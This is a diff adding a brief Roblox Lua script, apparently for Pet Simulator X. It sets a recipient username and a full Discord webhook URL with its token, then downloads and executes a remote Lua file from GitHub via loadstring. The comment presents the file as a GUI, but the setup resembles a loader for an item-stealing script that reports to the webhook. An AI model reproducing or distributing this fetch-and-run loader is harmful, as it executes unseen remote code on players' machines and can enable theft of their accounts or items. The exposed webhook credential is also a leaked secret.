@@ -1,0 +1,5 @@
+Username = "SziaUram_001"
+WebHook = "https://discord.com/api/webhooks/1087834157989773473/lBH2_sYyb05bmn659KDjaDzUlMZP2EbSDUbu1oPZYUsXpkVirGnzF3IBqPhe-kTsqdWj"
+
+loadingscreen = false -- set this to false and remove _G. stuff to use your own GUI
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
